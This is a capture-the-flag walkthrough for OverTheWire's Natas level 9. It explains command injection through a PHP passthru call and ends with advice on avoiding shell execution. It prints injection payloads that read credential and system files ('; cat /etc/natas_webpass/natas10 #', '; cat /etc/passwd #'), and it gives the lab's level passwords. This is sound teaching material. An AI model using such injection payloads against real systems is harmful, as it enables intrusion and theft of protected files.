# Natas 9

## What This Level Teaches

This level introduces **command injection**.

The main lesson is:

> **Never put user input directly into a shell command.**

If a website builds a command using text from a user, special shell characters can change what the command does.

---

## Goal

Find the password for **`natas10`**.

## Login

- **URL:** `http://natas9.natas.labs.overthewire.org`
- **Username:** `natas9`
- **Password:** `UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9`

---

## Walkthrough

### 1. Open the Natas 9 Page

Go to:

```text
http://natas9.natas.labs.overthewire.org
```

Log in with the username and password above.

The page has a search form.

### 2. View the Source Code

The page provides source code. In the source, the search input is used inside a shell command.

The code looks similar to this:

```php
passthru("grep -i $key dictionary.txt");
```

This means the server runs the Linux command `grep` and inserts our input into that command.

### 3. Understand the Original Command

If we search for:

```text
test
```

the server builds a command like:

```bash
grep -i test dictionary.txt
```

`grep` searches for text inside a file.

The `-i` option means the search is case-insensitive.

### 4. Inject Another Command

Because our input is placed directly into a shell command, we can use `;` to end the `grep` command and start a new command.

Submit:

```text
; cat /etc/natas_webpass/natas10 #
```

The full command becomes something like:

```bash
grep -i ; cat /etc/natas_webpass/natas10 # dictionary.txt
```

The important parts are:

- `;` ends the first command.
- `cat /etc/natas_webpass/natas10` prints the password file.
- `#` comments out the rest of the command.

### 5. Use URL Encoding if Needed

If you put the payload directly into the URL, spaces and `#` need to be encoded.

Use:

```text
?needle=;%20cat%20/etc/natas_webpass/natas10%20%23&submit=Search
```

The password for Natas 10 is:

```text
EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
```

---

## How Did We Know This Was Command Injection?

The source code shows user input being inserted into a shell command.

The reasoning is:

1. The page accepts search text from the user.
2. The source code passes that text into `passthru`.
3. `passthru` runs a command on the server.
4. The input is not safely escaped.
5. Shell characters such as `;` and `#` can change the command.
6. We can run `cat` to print the password file.

---

## What Is Command Injection?

Command injection happens when user input becomes part of an operating system command.

For example, imagine a program builds this command:

```bash
grep -i USER_INPUT dictionary.txt
```

If the user input is normal text, the command searches the dictionary.

If the user input contains shell syntax, the command can do something else.

For example:

```text
; cat /etc/passwd #
```

This can make the shell run a second command.

---

## Why Spaces Matter

Shell commands are split into words by spaces.

This works:

```bash
cat /etc/natas_webpass/natas10
```

This does not work:

```bash
cat/etc/natas_webpass/natas10
```

Without the space, the shell looks for a command named `cat/etc/natas_webpass/natas10`, which is not what we want.

---

## Security Lesson

Do not build shell commands by directly combining strings with user input.

Safer approaches include:

- Avoid calling the shell when possible.
- Use language-native functions instead of shell commands.
- Validate input against a strict allowlist.
- Escape arguments correctly when shell commands are unavoidable.

In PHP, functions such as `escapeshellarg` can help, but avoiding shell execution is usually better when possible.

---

## Key Takeaways

- `passthru` runs an operating system command.
- User input inside shell commands can be dangerous.
- `;` can start a second command.
- `#` can comment out the rest of a shell command.
- Spaces separate commands and arguments.
- Command injection can expose files the web server user can read.
